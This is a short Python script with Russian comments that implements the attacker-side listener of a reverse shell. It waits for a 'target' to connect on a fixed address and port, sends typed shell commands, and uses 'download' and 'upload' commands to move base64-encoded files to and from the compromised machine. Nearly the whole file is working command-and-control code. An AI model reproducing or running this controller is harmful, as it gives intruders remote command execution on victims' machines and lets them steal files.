#!/usr/bin/python
import socket 
import json
import base64

#конвектирует данные пайтона в джейсон а его в свою очередь в байты
def reliable_send(data):
        json_data = json.dumps(data).encode()
        target.send(json_data)

#принимает большие данные по частям
def reliable_recv():
        json_data = b""
        while True:
                try:
                        json_data = json_data + target.recv(1024)
                        return json.loads(json_data.decode())
                except ValueError:
                        continue



#отправляет команды, подгружает файлы, завершает сеанс
def shell():
        while True:
                command = input("*Shell#~%s: " % str(ip))
                reliable_send(command)
                if command == "q":
                        break
                elif command[:2] == "cd" and len(command) > 1:
                        continue
                elif command[:8] == "download":
                        with open(command[9:], "wb") as file:
                                result = reliable_recv()
                                try:
                                        file.write(base64.b64decode(result))
                                        print(f"Файл {command[9:]} успешно загружен")
                                except Exception as e:
                                        print(f"Ошибка загрузки файла: {e}")
                elif command[:6] == "upload":
                        try:
                                with open(command[7:], "rb") as file:
                                        reliable_send(base64.b64encode(file.read()).decode())
                                        print(f"Файл {command[7:]} успешно отправлен")
                        except FileNotFoundError:
                                print(f"Файл {command[7:]} не найден")
                                reliable_send("[!!] Файл не найден")
                else:
                        result = reliable_recv()
                        print(result)
#подключение и прослушивание
def server():
        global s
        global ip
        global target
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(("192.168.178.67",54321))
        s.listen(1)
        print("[+] Ожидание подключения...")
        target, ip = s.accept()
        print(f"[+] Подключение установлено с {ip}")

server()
shell()
s.close()
